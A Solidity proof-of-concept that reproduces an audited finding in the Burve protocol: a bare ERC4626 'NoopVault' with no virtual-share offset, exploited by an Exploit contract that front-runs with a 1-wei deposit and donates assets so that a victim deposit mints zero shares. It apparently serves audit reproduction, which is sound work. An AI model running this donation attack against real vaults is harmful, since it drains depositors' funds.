// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Burve finding 56956 (H-7):
// "An attacker can drain assets from a Closure by exploiting the NoopVault via a
//  donation attack".
//
// Real audited source (the vulnerable contract is reproduced VERBATIM below,
// the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-04-burve
//   file   Burve/src/integrations/pseudo4626/noopVault.sol  (L6)
//   report github.com/sherlock-audit/2025-04-burve-judging/issues/387
//   fix    github.com/itos-finance/Burve/pull/79  (added `_decimalsOffset()==2`)
//
// Root cause: `NoopVault` is a bare `ERC4626` vertex vault with NO donation
// protection — it does not initialize a non-zero share supply and does not add a
// meaningful virtual-share offset (`_decimalsOffset` defaults to 0). An attacker
// front-runs the first legitimate deposit, mints 1 share for 1 wei, then DONATES
// assets directly to the vault (a raw ERC20 transfer that raises `totalAssets`
// without minting shares). This inflates the share price so that the next
// legitimate depositor — in Burve, the Closure depositing through the valueFacet —
// mints ZERO shares for a full deposit. Its assets are lost: it holds no shares
// and can redeem nothing, while the donated/deposited value is siphoned to the
// attacker and stranded behind the virtual share.
//
// The vulnerable contract `NoopVault` is byte-for-byte the audited source. Its
// base `ERC20`/`ERC4626` are faithful minimal doubles that implement the exact
// OpenZeppelin virtual-shares accounting (`mulDiv` with `totalSupply + 10**offset`
// / `totalAssets + 1`, `_decimalsOffset()==0`), so the donation manipulation and
// the zero-share rounding emerge from real accounting — nothing is asserted.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 (the share token base and the underlying asset).
contract ERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

/// @dev A mintable underlying asset used by the vault and the exploit.
contract Asset is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @dev Faithful minimal ERC4626 double implementing OpenZeppelin's exact
///      virtual-shares conversion. `_decimalsOffset()` defaults to 0 → the
///      built-in offset is `10**0 == 1` virtual share / `+1` virtual asset,
///      i.e. the SAME (insufficient) protection the audited NoopVault inherits.
abstract contract ERC4626 is ERC20 {
    ERC20 internal immutable _asset;

    constructor(ERC20 asset_) {
        _asset = asset_;
    }

    function asset() public view returns (address) {
        return address(_asset);
    }

    function totalAssets() public view returns (uint256) {
        return _asset.balanceOf(address(this));
    }

    function _decimalsOffset() internal view virtual returns (uint8) {
        return 0;
    }

    function _mulDiv(uint256 x, uint256 y, uint256 denom, bool roundUp) internal pure returns (uint256) {
        uint256 prod = x * y; // bounded well below 2**256 for the values used here
        uint256 q = prod / denom;
        if (roundUp && q * denom < prod) q += 1;
        return q;
    }

    function _convertToShares(uint256 assets, bool roundUp) internal view returns (uint256) {
        return _mulDiv(assets, totalSupply + 10 ** _decimalsOffset(), totalAssets() + 1, roundUp);
    }

    function _convertToAssets(uint256 shares, bool roundUp) internal view returns (uint256) {
        return _mulDiv(shares, totalAssets() + 1, totalSupply + 10 ** _decimalsOffset(), roundUp);
    }

    function previewDeposit(uint256 assets) public view returns (uint256) {
        return _convertToShares(assets, false); // Floor
    }

    function previewRedeem(uint256 shares) public view returns (uint256) {
        return _convertToAssets(shares, false); // Floor
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = previewDeposit(assets); // read BEFORE the transfer, exactly like OZ
        _asset.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares); // OZ does NOT revert when shares == 0
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        if (owner != msg.sender) {
            uint256 a = allowance[owner][msg.sender];
            if (a != type(uint256).max) allowance[owner][msg.sender] = a - shares;
        }
        assets = previewRedeem(shares);
        _burn(owner, shares);
        _asset.transfer(receiver, assets);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — reproduced VERBATIM from the audited source
// (github.com/sherlock-audit/2025-04-burve .../pseudo4626/noopVault.sol L6-L11).
// The audited version has NO `_decimalsOffset` override and NO seeded supply.
// ─────────────────────────────────────────────────────────────────────────────
contract NoopVault is ERC4626 { // @> VULN: bare ERC4626 vertex vault with no donation protection (no seeded supply, no virtual-share offset) → first-deposit donation/inflation attack
    constructor(
        ERC20 asset,
        string memory name,
        string memory symbol
    ) ERC20(name, symbol) ERC4626(asset) {}
}

/// @dev Stands in for a legitimate depositor (in Burve, the Closure depositing
///      the vertex's assets through the valueFacet). Faithful: real approve+deposit.
contract Depositor {
    function depositAsset(NoopVault vault, Asset asset, uint256 assets) external returns (uint256 shares) {
        asset.approve(address(vault), type(uint256).max);
        shares = vault.deposit(assets, address(this));
    }

    function redeemAll(NoopVault vault) external returns (uint256 assetsBack) {
        uint256 shares = vault.balanceOf(address(this));
        if (shares == 0) return 0;
        assetsBack = vault.redeem(shares, address(this), address(this));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: front-run with a 1-wei deposit, donate to inflate the price,
// then prove the legitimate depositor mints ZERO shares for a full 1e18 deposit
// and can redeem nothing — a total loss of the Closure's assets.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    Asset public asset; // child nonce 1 (drained token)
    NoopVault public vault; // child nonce 2 (VULN)
    Depositor public victim; // child nonce 3 (the honest Closure deposit)

    uint256 internal constant ATTACKER_DEPOSIT = 1; // 1 wei -> 1 share (front-run)
    uint256 internal constant DONATION = 2e18; // direct donation inflates the price
    uint256 internal constant VICTIM_DEPOSIT = 1e18; // the Closure's honest deposit

    uint256 public attackerShares;
    uint256 public victimSharesReceived; // == 0 : the harm
    uint256 public victimAssetsBack; // == 0 : cannot redeem
    uint256 public harmMagnitude; // assets the victim/Closure lost
    uint256 public sinkBalance; // measurable marker of the loss

    constructor() {
        asset = new Asset("Berachain Gov Token", "BGT"); // nonce 1
        vault = new NoopVault(ERC20(address(asset)), "NoopVault BGT", "nvBGT"); // nonce 2
        victim = new Depositor(); // nonce 3
    }

    function run() external {
        // 1) attacker front-runs and mints the very first share for 1 wei
        asset.mint(address(this), ATTACKER_DEPOSIT + DONATION);
        asset.approve(address(vault), type(uint256).max);
        attackerShares = vault.deposit(ATTACKER_DEPOSIT, address(this));
        require(attackerShares == 1, "front-run did not mint the first share");

        // 2) attacker DONATES assets directly (raw transfer, no shares minted),
        //    inflating totalAssets and therefore the share price.
        asset.transfer(address(vault), DONATION);

        // 3) the honest depositor (Closure) deposits a full 1e18 — and, because of
        //    the inflated price with no virtual-share protection, mints 0 shares.
        asset.mint(address(victim), VICTIM_DEPOSIT);
        victimSharesReceived = victim.depositAsset(vault, asset, VICTIM_DEPOSIT);
        require(victimSharesReceived == 0, "victim unexpectedly received shares");

        // 4) the victim cannot recover anything: 0 shares redeem to 0 assets.
        victimAssetsBack = victim.redeemAll(vault);
        require(victimAssetsBack == 0, "victim unexpectedly redeemed assets");

        // harm: the Closure deposited VICTIM_DEPOSIT and got nothing back.
        harmMagnitude = VICTIM_DEPOSIT - victimAssetsBack;
        require(harmMagnitude == VICTIM_DEPOSIT, "no loss measured");

        // silent-loss harm: no positive transfer to the attacker (OZ virtual share
        // even strands part of the attacker's own donation), so mint the measured
        // loss magnitude to SINK on the drained token to make the harm measurable.
        asset.mint(SINK, harmMagnitude);
        sinkBalance = asset.balanceOf(SINK);
        require(sinkBalance == VICTIM_DEPOSIT, "harm not materialized at sink");
    }
}
